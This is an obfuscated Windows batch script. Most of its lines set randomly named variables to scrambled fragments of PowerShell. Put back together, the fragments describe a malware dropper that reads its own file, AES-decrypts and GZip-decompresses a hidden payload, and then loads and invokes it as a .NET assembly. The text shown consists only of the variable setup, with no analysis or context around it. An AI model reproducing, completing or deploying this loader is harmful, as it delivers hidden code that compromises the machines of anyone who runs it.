@echo off
set "qNNbzaQJuW=fhZ."
set "DGofmKCyBi=QKGy"
set "tiRAgJpKVQ='[-1"
set "bDdkBGLzjK=)) {"
set "plfuzrrUlk=ing("
set "mhBTrCAPNp=-4] "
set "VZugoMeOfe=3HWs"
set "qgocwZRbyO=orF'"
set "NeioByIWUA=ct S"
set "rcqeyKuwIK=New-"
set "jahsWaRJCo=.GZi"
set "qLNZyXzqHd=PKCS"
set "YDCAssuvgm=v4Ir"
set "BemxzqcTGW=[Sys"
set "cxCihlHOle=pres"
set "vsYELAyAbw=QKGy"
set "veuNmWKRMY=+hAO"
set "BHwfKXcBNt=y.Cr"
set "uphyGLKWkR=7;$E"
set "FIVKtMoCpf=EQKG"
set "WMWhGWUvub=$Egb"
set "OPEdXiqJiX=ose("
set "RdRLBRkGfV=join"
set "yphOQAOZQF=daeR"
set "BiihAlKqCX=stem"
set "JaoixUncLh=;$Md"
set "rqDgyYiwlF===')"
set "escQLAratc=yste"
set "ORQAVfURRc=y.Ci"
set "WFSqlZIgdp=ms ="
set "qeFASMRePy=il ="
set "YqNUwvoudv=..-1"
set "zJhrOZnEXK=m(, "
set "pAtPygfNqd=n ''"
set "CcyzHgUbaz=]::C"
set "hrQjLIdFwC=:('g"
set "neKeYhunjm=;$JW"
set "PjApRdphYh=rity"
set "aeUpcEndkK=.Sec"
set "ueeoOVbODZ=ionM"
set "ofpoOXuefx=Bmor"
set "eomAWWCBjd=k; }"
set "AhZfRdIAzj=IKSe"
set "hzfStuRYCe=EgbJ"
set "CwKJpUEDaq=ss -"
set "gnCtOLffgY=.Ass"
set "mGhoqpTaLj=);$E"
set "sEcscrEYtX=em.C"
set "sCvqScUPkj=)($F"
set "TbSJHAvlsj=lBE."
set "OlUvMNTGky== $E"
set "achmFYwJmP=TllA"
set "UlqgtqqBvL=EgbJ"
set "cjsowtIOEe=hy.A"
set "fBCBOHVbzh=null"
set "ZNQlwLJRbg=UGTu"
set "aubGSOaJcR=il);"
set "gnTjQJDZKF=Secu"
set "fNoctztxmh='')("
set "wNyJYxgawM=WfhZ"
set "wAIxJgQXYT= if "
set "gODkHYXTUK=0O+g"
set "OzqFMMvpht=-Obj"
set "fKNEOeAYyA=ress"
set "ngZPZwFJWi=Syst"
set "RYDUKnJEDf=morF"
set "wvkjdmKqDu=OyzA"
set "CHtYjfzLXj=.Cop"
set "byFUhrlAvu=ress"
set "TrKccgJFvG=Comp"
set "qHWwOALybv=ddin"
set "rkExdBLgRA=)($E"
set "rHxKmujacO=ecry"
set "LEZTSZdKTO=tem."
set "ngXyUHcEvx= = ["
set "PWrQUmeNAY= = N"
set "mdJGsGTJfd=tion"
set "HGqIordoaC=nSil"
set "kyyfEZKywo=$nWm"
set "bJSsPlsypH=grap"
set "wxnEHeNTHC=yste"
set "nKFqPuDzZI='gni"
set "rsnrmAoVLl=il.T"
set "xJDkvFJTYQ=ard."
set "nxNolTnokW=..-1"
set "cSxFKENmZa=comm"
set "rosnamgRal=3); "
set "QRUjAIbKEQ=IKSe"
set "FwMvEfOjTa=raph"
set "aonMDjgPnC=Star"
set "jHPQGMyLFH= [st"
set "nAOTEwmwqQ=('%~f0'"
set "bdOSWxvcNI=();$"
set "BvcrfptVvx=();$"
set "igTnNdpeJv= = $"
set "YxlhPiUhnq=gth)"
set "lEHyRbqjmh=$Mdu"
set "UyokWdYNys=Invo"
set "iCriqyjOvW=sGUc"
